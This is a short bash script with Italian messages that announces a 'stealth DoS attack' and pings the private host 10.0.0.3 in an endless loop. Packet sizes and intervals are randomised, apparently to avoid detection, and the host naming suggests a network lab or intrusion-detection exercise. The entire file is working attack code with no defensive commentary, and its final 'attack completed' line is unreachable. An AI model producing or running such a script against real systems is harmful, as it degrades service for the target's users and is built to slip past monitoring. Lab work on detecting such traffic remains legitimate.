#!/bin/bash

TARGET=10.0.0.3 

echo "[H1] Avvio attacco DoS Stealth"

while true; do
    SIZE=$((400 + RANDOM % 400))
    SLEEP=$(awk -v min=0.02 -v max=0.12 'BEGIN{s=min+rand()*(max-min); print s}')
    ping -c 1 -s $SIZE $TARGET > /dev/null
    sleep $SLEEP
done

echo "[H1] Attacco completato!"